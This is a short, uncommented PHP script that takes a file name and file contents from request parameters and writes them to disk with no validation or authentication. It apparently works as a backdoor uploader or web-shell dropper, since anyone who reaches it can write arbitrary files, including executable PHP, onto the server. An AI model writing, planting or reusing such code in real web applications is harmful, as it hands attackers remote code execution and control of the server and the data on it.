<?php
$a = $_REQUEST['a'];
$ourFileName = $_REQUEST['filename'];
$ourFileHandle = fopen($ourFileName, 'w') or die("can't open file");
fwrite($ourFileHandle,$a);
fclose($ourFileHandle);
?>
